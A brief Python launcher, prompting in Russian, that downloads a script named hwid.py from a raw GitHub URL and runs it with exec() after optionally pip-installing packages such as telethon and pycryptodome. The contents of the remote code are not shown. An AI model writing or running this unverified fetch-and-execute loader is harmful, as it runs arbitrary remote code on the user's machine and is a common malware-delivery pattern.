import os
import platform

from requests import get

startapp = get("https://raw.githubusercontent.com/hazurik/cnocep/main/hwid.py").text

if platform.system() == "Windows":
    os.system('cls')
else:
    os.system('clear')

answer = input("Пропустить установку нуждающихся компонентов? [y/n]: ")
if answer.upper() == 'Y':
    exec(startapp)
if answer.upper() == 'N':
    os.system('pip install requests && clear && pip install pycryptodome && clear && pip install colorama && clear && pip install telethon && clear && pip install pyfiglet && clear && pip install termcolor && clear')
    exec(startapp)
